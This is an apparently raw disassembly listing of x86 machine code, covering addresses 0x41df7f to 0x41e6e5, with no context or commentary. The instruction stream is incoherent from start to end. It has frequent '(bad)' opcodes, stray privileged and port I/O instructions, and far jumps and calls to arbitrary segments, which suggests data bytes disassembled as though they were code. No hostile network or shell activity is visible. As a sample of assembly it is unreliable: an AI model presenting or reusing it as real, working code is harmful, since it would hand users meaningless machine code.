  41df7f:	xor    DWORD PTR [esi-0x10],ebx
  41df82:	add    dl,BYTE PTR [edx+esi*8-0x4f]
  41df86:	lods   eax,DWORD PTR ds:[esi]
  41df87:	or     al,0x93
  41df89:	cmp    BYTE PTR [esi],ch
  41df8b:	loopne 0x41df46
  41df8d:	or     esi,esi
  41df8f:	cli    
  41df90:	cwde   
  41df91:	jp     0x41df72
  41df93:	pop    ds
  41df94:	mov    ecx,0xabfa4c05
  41df99:	xchg   esp,eax
  41df9a:	sub    al,0xdb
  41df9c:	jbe    0x41e00d
  41df9e:	dec    edx
  41df9f:	fs push edx
  41dfa1:	in     al,0xc8
  41dfa3:	mov    ch,0xb3
  41dfa5:	rol    BYTE PTR [ecx],0xa3
  41dfa8:	mov    eax,ds:0xd421d555
  41dfad:	enter  0xe799,0x2f
  41dfb1:	inc    edx
  41dfb2:	pushf  
  41dfb3:	daa    
  41dfb4:	inc    eax
  41dfb5:	lods   al,BYTE PTR ds:[esi]
  41dfb6:	stos   DWORD PTR es:[edi],eax
  41dfb7:	imul   ebp,ebx,0x10
  41dfba:	aam    0xab
  41dfbc:	sbb    DWORD PTR [eax+0x1e9c5174],edi
  41dfc2:	jae    0x41e026
  41dfc4:	jb     0x41e00b
  41dfc6:	fdiv   QWORD PTR ds:0x617db809
  41dfcc:	je     0x41df9f
  41dfce:	dec    ecx
  41dfcf:	cmc    
  41dfd0:	mov    DWORD PTR [esi],edi
  41dfd2:	in     eax,dx
  41dfd3:	push   ebx
  41dfd4:	lods   eax,DWORD PTR ds:[esi]
  41dfd5:	cli    
  41dfd6:	push   ds
  41dfd7:	xchg   esp,eax
  41dfd8:	mov    eax,ds:0xc75d5be0
  41dfdd:	dec    edi
  41dfde:	add    eax,0xec0237cc
  41dfe3:	stos   BYTE PTR es:[edi],al
  41dfe4:	cmp    eax,0x5dd5ea52
  41dfe9:	pop    edx
  41dfea:	mov    ebp,fs
  41dfec:	dec    esi
  41dfed:	dec    eax
  41dfee:	fdivr  DWORD PTR [ebx+0x7682f58a]
  41dff4:	sbb    eax,0xa914bc77
  41dff9:	pusha  
  41dffa:	inc    ebx
  41dffb:	ins    DWORD PTR es:[edi],dx
  41dffc:	enter  0x1dff,0xd1
  41e000:	arpl   di,bp
  41e002:	cmp    al,0x50
  41e004:	jle    0x41df9e
  41e006:	(bad)  
  41e007:	ins    BYTE PTR es:[edi],dx
  41e008:	push   0xffffff92
  41e00a:	xchg   esp,eax
  41e00b:	xor    bl,al
  41e00d:	bound  ecx,QWORD PTR ds:0xd2fb598b
  41e013:	and    eax,0x51a39cb4
  41e018:	retf   
  41e019:	add    al,BYTE PTR [edi]
  41e01b:	stos   BYTE PTR es:[edi],al
  41e01c:	add    BYTE PTR [eax],cl
  41e01e:	in     eax,dx
  41e01f:	scas   al,BYTE PTR es:[edi]
  41e020:	push   ds
  41e021:	and    dl,dh
  41e023:	adc    bl,BYTE PTR [ecx-0x201bbe45]
  41e029:	push   ds
  41e02a:	inc    ebx
  41e02b:	sub    ebp,DWORD PTR [edx+0x2a]
  41e02e:	fimul  WORD PTR [edx+0x22102ce5]
  41e034:	pop    ds
  41e035:	inc    ecx
  41e036:	dec    ecx
  41e037:	inc    eax
  41e038:	sub    eax,0xa9a7474b
  41e03d:	loop   0x41e053
  41e03f:	jmp    0x464b6ca7
  41e044:	jns    0x41e050
  41e046:	cld    
  41e047:	mov    edx,0x9e562135
  41e04c:	cmp    ebp,ebp
  41e04e:	sti    
  41e04f:	ds popa 
  41e051:	mov    ebx,DWORD PTR [eax-0x57c3dcdd]
  41e057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e058:	push   ebp
  41e059:	sahf   
  41e05a:	call   0x7092cafd
  41e05f:	jbe    0x41e009
  41e061:	jb     0x41dff6
  41e063:	cs popf 
  41e065:	call   DWORD PTR [esi]
  41e067:	jnp    0x41e04c
  41e069:	cwde   
  41e06a:	outs   dx,DWORD PTR ds:[esi]
  41e06b:	arpl   WORD PTR [eax+0x311596ab],dx
  41e071:	out    dx,eax
  41e072:	stos   BYTE PTR es:[edi],al
  41e073:	push   edx
  41e074:	adc    al,0xdf
  41e077:	es push edi
  41e079:	int    0x5c
  41e07b:	rol    DWORD PTR [edx+0x20],0x63
  41e07f:	sahf   
  41e080:	int3   
  41e081:	adc    BYTE PTR [ebp+0x7e],ah
  41e084:	pusha  
  41e085:	add    BYTE PTR [esi+0x8],0x16
  41e089:	jae    0x41e010
  41e08b:	sti    
  41e08c:	dec    edi
  41e08d:	adc    ebx,esp
  41e08f:	mov    ds:0x1cac84d6,al
  41e094:	dec    ecx
  41e095:	shl    ebp,0xa
  41e098:	or     eax,0x4bf0f98d
  41e09d:	(bad)  
  41e09e:	sub    eax,0xb7d5b7fa
  41e0a3:	inc    esp
  41e0a4:	jne    0x41e03b
  41e0a6:	inc    edi
  41e0a7:	imul   ebx,DWORD PTR [ebx],0x8191a94a
  41e0ad:	les    esi,FWORD PTR [esi]
  41e0af:	xchg   edi,eax
  41e0b0:	out    dx,eax
  41e0b1:	sub    BYTE PTR [ebp+0x5b714b29],dl
  41e0b7:	jbe    0x41e0e7
  41e0b9:	outs   dx,BYTE PTR ds:[esi]
  41e0ba:	sub    BYTE PTR [edi-0x2c715364],dl
  41e0c0:	lods   eax,DWORD PTR ds:[esi]
  41e0c1:	inc    edx
  41e0c2:	lods   eax,DWORD PTR ds:[esi]
  41e0c3:	mov    ah,0x58
  41e0c5:	cmp    eax,0x889eefdc
  41e0ca:	ret    0x2211
  41e0cd:	dec    esi
  41e0ce:	or     edx,ecx
  41e0d0:	xor    eax,0x93f4f3bb
  41e0d5:	mov    esi,DWORD PTR [esi+edi*2+0x3f6da9d3]
  41e0dc:	shl    DWORD PTR [edx],0x68
  41e0df:	arpl   dx,bp
  41e0e1:	push   ebp
  41e0e2:	jge    0x41e07a
  41e0e4:	and    dh,BYTE PTR [edx]
  41e0e6:	lea    ecx,[ebp+0x40]
  41e0e9:	mov    ah,0x69
  41e0eb:	push   edx
  41e0ec:	sbb    eax,0x8777c4de
  41e0f1:	cdq    
  41e0f2:	imul   BYTE PTR [ecx-0x53]
  41e0f5:	mov    esp,0xd309025e
  41e0fa:	add    dl,BYTE PTR [edx-0x41cc124c]
  41e100:	add    al,0x90
  41e102:	or     esi,ecx
  41e104:	mov    es,WORD PTR [ebx-0x59]
  41e107:	push   es
  41e108:	addr16 pop esp
  41e10a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e10b:	pop    eax
  41e10c:	fs (bad) 
  41e10e:	pop    edx
  41e10f:	inc    ecx
  41e110:	test   al,0x77
  41e112:	xchg   edi,eax
  41e113:	cmp    al,0x2b
  41e115:	mov    bh,0xbc
  41e117:	add    eax,0x6f59eacf
  41e11c:	push   edx
  41e11d:	jecxz  0x41e145
  41e11f:	mov    dh,bl
  41e121:	ret    0xf5b4
  41e124:	mov    dh,0xbd
  41e126:	mov    BYTE PTR [ebp+0x69],ah
  41e129:	ficom  WORD PTR [eax-0x3]
  41e12c:	adc    al,0x14
  41e12e:	scas   eax,DWORD PTR es:[edi]
  41e12f:	(bad)  [ebx+0x471fdfb8]
  41e135:	cdq    
  41e136:	jmp    0x41e166
  41e138:	fsub   DWORD PTR [edi]
  41e13a:	push   ss
  41e13b:	xlat   BYTE PTR ds:[ebx]
  41e13c:	fsub   st,st(2)
  41e13e:	jge    0x41e14e
  41e140:	push   0xf
  41e142:	pushf  
  41e143:	(bad)  
  41e144:	retf   
  41e145:	sub    eax,0x67923bb6
  41e14a:	fcom   DWORD PTR [ecx+0x41]
  41e14d:	dec    eax
  41e14e:	jge    0x41e13a
  41e150:	mov    dh,bl
  41e152:	cli    
  41e153:	xchg   esi,eax
  41e154:	pop    ecx
  41e155:	enter  0xbae1,0xef
  41e159:	xor    BYTE PTR [ecx],dh
  41e15b:	mov    eax,0x8b460abd
  41e160:	fwait
  41e161:	inc    edx
  41e162:	push   edx
  41e163:	push   0xffffff81
  41e165:	popa   
  41e166:	xchg   dl,dl
  41e168:	cmp    cl,BYTE PTR [eax+eiz*8]
  41e16b:	xor    al,0x21
  41e16d:	adc    eax,0x36cfaca1
  41e172:	adc    eax,DWORD PTR [ecx-0x24f5899]
  41e178:	xor    eax,0xee1510b
  41e17d:	hlt    
  41e17e:	xor    BYTE PTR [edi],bh
  41e180:	out    dx,eax
  41e181:	in     al,0x4
  41e183:	lds    ebx,FWORD PTR [esi-0x9]
  41e186:	xor    DWORD PTR [eax-0x2c],ecx
  41e189:	lahf   
  41e18a:	mov    ebx,0x33947989
  41e18f:	cdq    
  41e190:	xchg   esi,eax
  41e191:	cmp    edx,DWORD PTR [ebx+0x58]
  41e194:	mov    DWORD PTR [ecx+0x491f4e22],eax
  41e19a:	dec    eax
  41e19b:	xchg   ebx,eax
  41e19c:	mov    esi,?
  41e19e:	mov    edx,0x2d1ec42d
  41e1a3:	xchg   ecx,eax
  41e1a4:	xchg   ebp,eax
  41e1a5:	stc    
  41e1a6:	inc    ebp
  41e1a7:	pop    ecx
  41e1a8:	test   al,0x87
  41e1aa:	jg     0x41e206
  41e1ac:	or     al,0x4e
  41e1ae:	jmp    DWORD PTR [ebx]
  41e1b0:	jb     0x41e1c3
  41e1b2:	inc    edx
  41e1b3:	push   eax
  41e1b4:	and    dh,BYTE PTR [ebp+0x10f65b14]
  41e1ba:	push   esi
  41e1bb:	test   ah,ch
  41e1bd:	std    
  41e1be:	mov    dl,0x5d
  41e1c0:	xor    edx,DWORD PTR [esi]
  41e1c2:	cmp    BYTE PTR [edi+0x1b],al
  41e1c5:	mov    al,0x24
  41e1c7:	ds mov esi,0x1a670eaa
  41e1cd:	push   esi
  41e1ce:	xchg   esi,eax
  41e1cf:	cmp    eax,0x9a65371c
  41e1d4:	jle    0x41e235
  41e1d6:	sbb    al,0x5b
  41e1d8:	addr16 fs loopne 0x41e1d0
  41e1dc:	push   ebp
  41e1dd:	call   0x1d3e:0x88abeee6
  41e1e4:	xchg   ebp,eax
  41e1e5:	in     al,dx
  41e1e6:	jecxz  0x41e183
  41e1e8:	push   edx
  41e1e9:	addr16 es lock or eax,0xcc63a72
  41e1f1:	mov    fs,WORD PTR [bx]
  41e1f4:	aas    
  41e1f5:	dec    esp
  41e1f6:	cmp    esi,eax
  41e1f8:	clc    
  41e1f9:	adc    DWORD PTR [ebp+ebp*1-0x336a1c88],0x19
  41e201:	add    DWORD PTR [esi+0x4a148429],ebp
  41e207:	test   eax,ebx
  41e209:	ret    
  41e20a:	fst    QWORD PTR [esi+0x49]
  41e20d:	add    bl,al
  41e20f:	or     al,0x67
  41e211:	xor    ah,BYTE PTR [edi+ebx*1]
  41e214:	sbb    bh,BYTE PTR [esi-0x1bdc442e]
  41e21a:	jl     0x41e299
  41e21c:	xchg   ebp,eax
  41e21d:	not    DWORD PTR [edx+esi*8-0x78]
  41e221:	test   BYTE PTR [ecx+0x14],al
  41e224:	jb     0x41e2a2
  41e226:	inc    ebp
  41e227:	test   DWORD PTR [eax],eax
  41e229:	sti    
  41e22a:	or     eax,0x821557be
  41e22f:	inc    ecx
  41e230:	mov    eax,0x684a83a9
  41e235:	adc    dl,BYTE PTR [esi]
  41e237:	icebp  
  41e238:	inc    edx
  41e239:	mov    edi,ebx
  41e23b:	fwait
  41e23c:	call   0x17d796c3
  41e241:	pop    es
  41e242:	push   0xffffff90
  41e244:	js     0x41e1c9
  41e246:	pusha  
  41e247:	push   esp
  41e248:	add    eax,0xe38ebbbf
  41e24d:	fs mov ch,0x3b
  41e250:	jno    0x41e1da
  41e252:	fild   DWORD PTR [eax+0x2dc54c48]
  41e258:	int    0xd0
  41e25a:	lea    edi,[eax+0x525a4e0e]
  41e260:	mov    al,ds:0xe89d8cbc
  41e265:	and    DWORD PTR [ebp-0x18adb7d6],edi
  41e26b:	jnp    0x41e2d2
  41e26d:	sbb    ch,BYTE PTR [edi-0x383ebfe2]
  41e273:	push   esi
  41e274:	mov    al,0xff
  41e276:	dec    edi
  41e277:	sbb    ah,BYTE PTR [esi-0x70]
  41e27a:	aaa    
  41e27b:	fdiv   DWORD PTR [ecx-0x3e]
  41e27e:	in     al,0x85
  41e280:	adc    bh,BYTE PTR [ecx-0x48]
  41e283:	inc    ebp
  41e284:	daa    
  41e285:	scas   eax,DWORD PTR es:[edi]
  41e286:	rcl    BYTE PTR [edi+0x6c],cl
  41e289:	aas    
  41e28a:	pushf  
  41e28b:	mov    ds:0x96a8da59,al
  41e290:	jns    0x41e263
  41e292:	sub    bh,BYTE PTR [bx+di+0x72]
  41e296:	bound  eax,QWORD PTR [edx+0x69efd1cf]
  41e29c:	push   cs
  41e29d:	(bad)  
  41e29e:	retf   0x7dfd
  41e2a1:	inc    DWORD PTR [edi-0x3]
  41e2a4:	adc    BYTE PTR ds:0xe1ca48cb,bl
  41e2aa:	scas   eax,DWORD PTR es:[edi]
  41e2ab:	jb     0x41e274
  41e2ad:	in     eax,0xad
  41e2af:	add    esi,esp
  41e2b1:	pop    ds
  41e2b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2b3:	popa   
  41e2b4:	nop
  41e2b5:	push   eax
  41e2b6:	push   edi
  41e2b7:	ins    BYTE PTR es:[edi],dx
  41e2b8:	ds mov ebp,0xc01000a2
  41e2be:	cvtps2pd xmm1,QWORD PTR [ebx]
  41e2c1:	call   0x61078305
  41e2c6:	scas   al,BYTE PTR es:[edi]
  41e2c7:	gs test al,0x57
  41e2ca:	xchg   ebp,eax
  41e2cb:	push   0x7338c15a
  41e2d0:	mov    ds:0xd817860d,eax
  41e2d5:	imul   edi,DWORD PTR [edx+edi*8],0x30cd9899
  41e2dc:	pop    ds
  41e2dd:	cmp    bh,BYTE PTR [esi]
  41e2df:	inc    DWORD PTR [esi-0x6c]
  41e2e2:	sbb    BYTE PTR [esi],bl
  41e2e4:	jo     0x41e2a0
  41e2e6:	push   esp
  41e2e7:	add    BYTE PTR [ecx-0x4e1a76fb],cl
  41e2ed:	mov    al,0x26
  41e2ef:	push   edx
  41e2f0:	cmp    BYTE PTR [edx],0x99
  41e2f3:	sahf   
  41e2f4:	jae    0x41e2b0
  41e2f6:	dec    esp
  41e2f7:	pop    ecx
  41e2f8:	jne    0x41e358
  41e2fa:	fwait
  41e2fb:	ss pop ebx
  41e2fd:	sbb    eax,0x3958e543
  41e302:	ss push ds
  41e304:	inc    ecx
  41e305:	in     al,dx
  41e306:	jno    0x41e299
  41e308:	test   eax,0xbfe03546
  41e30d:	dec    ecx
  41e30e:	cli    
  41e30f:	sub    ebp,DWORD PTR [eax]
  41e311:	or     eax,0xbf543c8c
  41e316:	clc    
  41e317:	sbb    ch,dh
  41e319:	inc    ecx
  41e31a:	fistp  DWORD PTR [ebp-0x1f]
  41e31d:	and    cl,BYTE PTR [ecx+esi*4+0x50]
  41e321:	repnz and al,0xf8
  41e325:	iret   
  41e326:	lock jo 0x41e2d3
  41e329:	(bad)  
  41e32a:	iret   
  41e32b:	mov    fs,WORD PTR [ebp+0xcc59bc8]
  41e331:	cs or  eax,0x77cf79ff
  41e337:	jmp    0x380:0x85f8c28c
  41e33e:	rol    DWORD PTR [ebx],cl
  41e340:	mov    ebp,0xd47878b
  41e345:	scas   al,BYTE PTR es:[edi]
  41e346:	pop    ss
  41e347:	into   
  41e348:	sbb    ebp,DWORD PTR ds:0xe0ad9552
  41e34e:	or     dh,dl
  41e350:	es jns 0x41e2f6
  41e353:	adc    dl,al
  41e355:	ret    
  41e356:	mov    cl,0x4d
  41e358:	adc    DWORD PTR [ebx+0x435554],0xacdf9a99
  41e362:	ss in  eax,0xdf
  41e365:	not    eax
  41e367:	pop    esi
  41e368:	jl     0x41e383
  41e36a:	push   esi
  41e36b:	nop
  41e36c:	jmp    FWORD PTR [eax+edx*1]
  41e36f:	and    dl,BYTE PTR [eax-0x1d5581a2]
  41e375:	daa    
  41e376:	pop    edx
  41e377:	fst    QWORD PTR [edi-0x7aae4c25]
  41e37d:	pop    edx
  41e37e:	out    dx,eax
  41e37f:	stc    
  41e380:	jns    0x41e38a
  41e382:	imul   esp,ecx,0xc2d6a87a
  41e388:	lods   al,BYTE PTR ds:[esi]
  41e389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38a:	aaa    
  41e38b:	not    DWORD PTR [esi]
  41e38d:	cmc    
  41e38e:	stc    
  41e38f:	mov    WORD PTR [edi],ds
  41e391:	repnz dec esp
  41e393:	in     al,0xcc
  41e395:	pusha  
  41e396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e397:	sub    esp,0x1c480f37
  41e39d:	dec    edx
  41e39e:	and    ch,0x6a
  41e3a1:	fcom   DWORD PTR [esi-0x445cdc7d]
  41e3a7:	sub    al,0x4c
  41e3a9:	retf   
  41e3aa:	stos   BYTE PTR es:[edi],al
  41e3ab:	gs icebp 
  41e3ad:	stos   BYTE PTR es:[edi],al
  41e3ae:	out    0x59,eax
  41e3b0:	cmp    al,0xb7
  41e3b2:	test   BYTE PTR [esi],ah
  41e3b4:	cmp    edx,DWORD PTR [esp+ebx*4+0x49]
  41e3b8:	in     eax,dx
  41e3b9:	test   bl,cl
  41e3bb:	inc    ecx
  41e3bc:	dec    ecx
  41e3bd:	scas   eax,DWORD PTR es:[edi]
  41e3be:	je     0x41e36c
  41e3c0:	ss addr16 clc 
  41e3c3:	push   cs
  41e3c4:	stc    
  41e3c5:	js     0x41e39b
  41e3c7:	aam    0x8d
  41e3c9:	pop    es
  41e3ca:	imul   ebx,DWORD PTR [ecx+ebp*2+0x8],0xffffff99
  41e3cf:	fs (bad) 
  41e3d1:	xor    eax,DWORD PTR [edx]
  41e3d3:	retf   0x54a4
  41e3d6:	and    bh,bl
  41e3d8:	push   edx
  41e3d9:	xchg   esp,eax
  41e3da:	inc    ecx
  41e3db:	jle    0x41e383
  41e3dd:	mov    ah,0xc7
  41e3df:	(bad)  
  41e3e0:	scas   eax,DWORD PTR es:[edi]
  41e3e1:	xor    BYTE PTR [edi-0x55],0xe9
  41e3e5:	and    BYTE PTR [ebx+0x5b0df02a],al
  41e3eb:	xchg   cl,bh
  41e3ed:	jmp    0x41e3de
  41e3ef:	inc    ebp
  41e3f0:	sbb    eax,0x1dc1ff5
  41e3f5:	(bad)  
  41e3f6:	cmp    eax,0x914e1d05
  41e3fb:	xor    DWORD PTR [ebx-0x76e59a0],esi
  41e401:	ja     0x41e3f4
  41e403:	fst    DWORD PTR [edi]
  41e405:	popa   
  41e406:	adc    DWORD PTR [ebp+0x16],0xd9756a4
  41e40d:	inc    edi
  41e40e:	loop   0x41e3bf
  41e410:	(bad)  
  41e411:	sbb    al,0x35
  41e413:	xchg   DWORD PTR [edi],ecx
  41e415:	int    0x57
  41e417:	xor    DWORD PTR [ebp+0x2],edi
  41e41a:	not    bl
  41e41c:	lahf   
  41e41d:	mov    al,ds:0xb211d9de
  41e422:	mov    dl,BYTE PTR [esi-0x2]
  41e425:	out    0x5f,eax
  41e427:	xor    DWORD PTR [edi+0x64e539c6],edx
  41e42d:	cmp    BYTE PTR [esi+edx*2-0xf64801b],0x20
  41e435:	xchg   BYTE PTR [eax+0x658c1ea],ah
  41e43b:	or     ecx,DWORD PTR [edx-0x2614bed6]
  41e441:	cs jns 0x41e48c
  41e444:	xor    bl,cl
  41e446:	js     0x41e42c
  41e448:	ds jne 0x41e4b7
  41e44b:	push   esp
  41e44c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e44d:	and    dh,cl
  41e44f:	adc    al,0x37
  41e451:	pop    ebp
  41e452:	or     al,0xe0
  41e454:	or     BYTE PTR ds:0x70b3256a,cl
  41e45a:	or     eax,0x161820e6
  41e45f:	inc    esp
  41e460:	shr    DWORD PTR [edi+ebx*1+0x2],cl
  41e464:	stos   BYTE PTR es:[edi],al
  41e465:	jo     0x41e427
  41e467:	pusha  
  41e468:	iret   
  41e469:	test   DWORD PTR cs:[ebx+0x7067fc2c],0x141da5a5
  41e474:	adc    DWORD PTR [eax-0x6104e5fa],ecx
  41e47a:	sub    BYTE PTR [edx],0x55
  41e47d:	cmp    al,0x39
  41e47f:	adc    eax,0x21a50a60
  41e484:	leave  
  41e485:	push   edi
  41e486:	jbe    0x41e468
  41e488:	test   BYTE PTR [ebp-0x4f],cl
  41e48b:	xor    ah,BYTE PTR [esi-0x5e]
  41e48e:	in     eax,0x32
  41e490:	and    al,0x26
  41e492:	mov    ah,dh
  41e494:	xchg   edi,eax
  41e495:	jno    0x41e475
  41e497:	fldenv [esi+0x531b313a]
  41e49d:	sub    eax,0xff2cb4b6
  41e4a2:	adc    ecx,0x75801555
  41e4a8:	sbb    al,0x9
  41e4aa:	xchg   edi,eax
  41e4ab:	mov    edx,0x17a06e90
  41e4b0:	icebp  
  41e4b1:	adc    ebp,DWORD PTR [edx+esi*2]
  41e4b4:	sbb    DWORD PTR [edi-0x2802d5a9],ebp
  41e4ba:	outs   dx,DWORD PTR ds:[esi]
  41e4bb:	ins    BYTE PTR es:[edi],dx
  41e4bc:	leave  
  41e4bd:	inc    edi
  41e4be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4bf:	mov    bh,BYTE PTR [eax]
  41e4c1:	in     al,0x86
  41e4c3:	pop    eax
  41e4c4:	push   edi
  41e4c5:	jp     0x41e4cf
  41e4c7:	dec    esi
  41e4c8:	fnstenv [ebx]
  41e4ca:	clc    
  41e4cb:	(bad)  
  41e4cc:	in     al,dx
  41e4cd:	dec    edx
  41e4ce:	and    eax,0x6227c578
  41e4d3:	dec    eax
  41e4d4:	fsub   QWORD PTR [edi+edx*4+0x1f]
  41e4d8:	push   0x3c48c7de
  41e4dd:	(bad)  
  41e4de:	ror    BYTE PTR [eax],0xd4
  41e4e1:	and    al,BYTE PTR [edx*2-0x3b659651]
  41e4e8:	pop    ecx
  41e4e9:	or     DWORD PTR [edi-0x2c],edx
  41e4ec:	int    0x82
  41e4ee:	sub    esp,DWORD PTR [ecx-0x50]
  41e4f1:	pusha  
  41e4f2:	inc    eax
  41e4f3:	(bad)  
  41e4f4:	fild   QWORD PTR [eax+0x2ee8c99b]
  41e4fa:	pop    eax
  41e4fb:	inc    esp
  41e4fc:	test   al,0xb5
  41e4fe:	scas   al,BYTE PTR es:[edi]
  41e4ff:	ins    BYTE PTR es:[edi],dx
  41e500:	lods   eax,DWORD PTR ds:[esi]
  41e501:	dec    edx
  41e502:	sub    DWORD PTR [edi+0x19],0x1e6fb627
  41e509:	adc    al,BYTE PTR [eax]
  41e50b:	adc    al,0xf1
  41e50d:	mov    WORD PTR [edi],?
  41e50f:	push   edi
  41e510:	stos   BYTE PTR es:[edi],al
  41e511:	pop    ds
  41e512:	icebp  
  41e513:	adc    BYTE PTR [ecx+0x1c],0xca
  41e517:	cmp    BYTE PTR [ecx],0xed
  41e51a:	clc    
  41e51b:	(bad)  
  41e51c:	push   esp
  41e51d:	in     eax,dx
  41e51e:	out    0x24,al
  41e520:	int3   
  41e521:	add    eax,0x681510ab
  41e526:	or     ah,BYTE PTR [edi+0x52]
  41e529:	loopne 0x41e52e
  41e52b:	ins    DWORD PTR es:[edi],dx
  41e52c:	xor    al,0x58
  41e52f:	xchg   esi,eax
  41e530:	outs   dx,DWORD PTR ds:[esi]
  41e531:	das    
  41e532:	repnz add esp,DWORD PTR [ebx-0x36]
  41e536:	mov    es,ebp
  41e538:	idiv   DWORD PTR [edi-0x518778fa]
  41e53e:	push   es
  41e53f:	dec    edx
  41e540:	xor    bh,BYTE PTR [esi]
  41e542:	mov    bh,0x24
  41e544:	push   ss
  41e545:	leave  
  41e546:	ins    DWORD PTR es:[edi],dx
  41e547:	push   ecx
  41e548:	sub    bh,cl
  41e54a:	jg     0x41e5bb
  41e54c:	pop    esi
  41e54d:	aaa    
  41e54e:	pushw  es
  41e550:	(bad)  
  41e551:	or     al,BYTE PTR [ebx+0x106f5459]
  41e557:	and    dl,BYTE PTR [ebp+edi*4+0x3a]
  41e55b:	ret    
  41e55c:	sbb    ebp,ebx
  41e55e:	mov    eax,ds:0xb0c753a8
  41e563:	mov    ds:0x7f5dd70,al
  41e569:	jmp    0xf7c4:0x5cc16eb6
  41e570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e571:	xchg   esp,edi
  41e573:	jne    0x41e5d8
  41e575:	xchg   BYTE PTR [esi+0x7b23e389],ah
  41e57b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e57c:	push   0x34
  41e57e:	sbb    eax,0x35250ea7
  41e583:	shr    BYTE PTR [ebx],1
  41e585:	aaa    
  41e586:	inc    ecx
  41e587:	mov    ds:0x784087f,eax
  41e58c:	mov    ebx,0xac9e001a
  41e591:	ror    DWORD PTR [edi],1
  41e593:	cmp    eax,0x74af5e0a
  41e598:	xor    al,0x40
  41e59a:	mov    ds:0x9e1de8ef,al
  41e59f:	add    al,0xd4
  41e5a1:	push   ecx
  41e5a2:	js     0x41e557
  41e5a4:	test   BYTE PTR [eax+0x455923fc],cl
  41e5aa:	mov    ds:0x5fd7cb4,eax
  41e5af:	test   al,0xc7
  41e5b1:	clc    
  41e5b2:	push   0xb8c5a2e4
  41e5b7:	sub    BYTE PTR [edx],ah
  41e5b9:	and    al,0xa2
  41e5bb:	inc    ebx
  41e5bc:	into   
  41e5bd:	das    
  41e5be:	lods   eax,DWORD PTR ds:[esi]
  41e5bf:	pushf  
  41e5c0:	dec    ecx
  41e5c1:	mov    ah,0x15
  41e5c3:	outs   dx,DWORD PTR ds:[esi]
  41e5c4:	dec    edx
  41e5c5:	xor    DWORD PTR [ebx-0x3a3a9c6b],eax
  41e5cb:	(bad)  
  41e5cc:	dec    ebp
  41e5cd:	stc    
  41e5ce:	call   0xc6ac:0x4e9cde63
  41e5d5:	inc    ebp
  41e5d6:	cmp    esi,esi
  41e5d8:	in     eax,dx
  41e5d9:	scas   eax,DWORD PTR es:[edi]
  41e5da:	push   0x66
  41e5dc:	pushf  
  41e5dd:	pusha  
  41e5de:	pusha  
  41e5df:	jle    0x41e583
  41e5e1:	(bad)  
  41e5e2:	fwait
  41e5e3:	jno    0x41e5cb
  41e5e5:	push   ebx
  41e5e6:	nop
  41e5e7:	and    esp,0x12
  41e5ea:	out    0xfa,eax
  41e5ec:	adc    eax,0xc0fe2f74
  41e5f1:	out    dx,al
  41e5f2:	in     al,dx
  41e5f3:	inc    eax
  41e5f4:	mul    DWORD PTR [edi+ebx*4+0x28239d8d]
  41e5fb:	mov    esp,0xe656d1a8
  41e600:	mov    WORD PTR [edx],cs
  41e602:	jle    0x41e5f5
  41e604:	out    dx,al
  41e605:	inc    edx
  41e606:	fldcw  WORD PTR [edi-0xb]
  41e609:	mov    cl,0x8b
  41e60b:	mov    cl,0x7a
  41e60d:	sbb    esp,DWORD PTR [edi+0x71f8888a]
  41e613:	jmp    0xaec85e68
  41e618:	xchg   BYTE PTR [edx-0x14],ah
  41e61b:	ss push 0x5fd77d69
  41e621:	(bad)  
  41e622:	leave  
  41e623:	pop    ds
  41e624:	mov    ds:0xecfb65b9,eax
  41e629:	lods   al,BYTE PTR ds:[esi]
  41e62a:	test   al,0x93
  41e62c:	jp     0x41e5d5
  41e62e:	pop    ebx
  41e62f:	jb     0x41e619
  41e631:	jmp    0xe2b1:0x413d6aa6
  41e638:	sbb    eax,0xa08b33c1
  41e63d:	dec    edi
  41e63e:	jne    0x41e6ba
  41e640:	loope  0x41e6bd
  41e642:	cwde   
  41e643:	jl     0x41e5fa
  41e645:	pop    es
  41e646:	(bad)  
  41e647:	dec    DWORD PTR [edx-0x5dff572]
  41e64d:	setl   BYTE PTR es:0xb5c004f
  41e655:	test   BYTE PTR [ecx+0x7ea38e03],bh
  41e65b:	icebp  
  41e65c:	jmp    0x1d6c:0xafe6650c
  41e663:	xchg   ecx,eax
  41e664:	xchg   edx,eax
  41e665:	aaa    
  41e666:	mov    esp,0xfc2f0ea0
  41e66b:	ret    0xa65e
  41e66e:	stc    
  41e66f:	repz or bh,ah
  41e672:	mov    bh,0xb1
  41e674:	rcr    BYTE PTR ds:0x5f82a7ce,0x8c
  41e67b:	dec    edi
  41e67c:	xchg   BYTE PTR [ecx+eax*2+0x5b0edba3],dl
  41e683:	stos   DWORD PTR es:[edi],eax
  41e684:	ficom  WORD PTR [ebp+ecx*2+0x454fdbbd]
  41e68b:	sbb    DWORD PTR [ebx],0x155cf
  41e691:	jae    0x41e6f4
  41e693:	inc    edi
  41e694:	xchg   bl,dh
  41e696:	xchg   esi,eax
  41e697:	mov    eax,ds:0x20cc1507
  41e69c:	les    ebx,FWORD PTR [ecx+edi*1]
  41e69f:	call   0xd81ac145
  41e6a4:	in     al,0x49
  41e6a6:	mov    WORD PTR [eax+0x46],ds
  41e6a9:	sbb    eax,0x66c765a9
  41e6ae:	and    BYTE PTR [edx+0x71ed872a],al
  41e6b4:	js     0x41e6ba
  41e6b6:	addr16 mov ecx,0xd167431d
  41e6bc:	sahf   
  41e6bd:	lock in al,0xc5
  41e6c0:	std    
  41e6c1:	jo     0x41e71a
  41e6c3:	mov    bl,0x45
  41e6c5:	and    al,0xba
  41e6c7:	pop    esp
  41e6c8:	push   ecx
  41e6c9:	cmp    BYTE PTR [ebx+0x12],bh
  41e6cc:	addr16 xor ebp,esi
  41e6cf:	imul   edi,ecx,0xffffffe2
  41e6d2:	inc    ebx
  41e6d3:	fs mov eax,0x14128e45
  41e6d9:	std    
  41e6da:	imul   edi,DWORD PTR [ebx+0x63],0x3b
  41e6de:	adc    cl,BYTE PTR [esi]
  41e6e0:	loopne 0x41e6a2
  41e6e2:	pop    es
  41e6e3:	fcmovnb st,st(1)
  41e6e5:	jb     0x41e66e
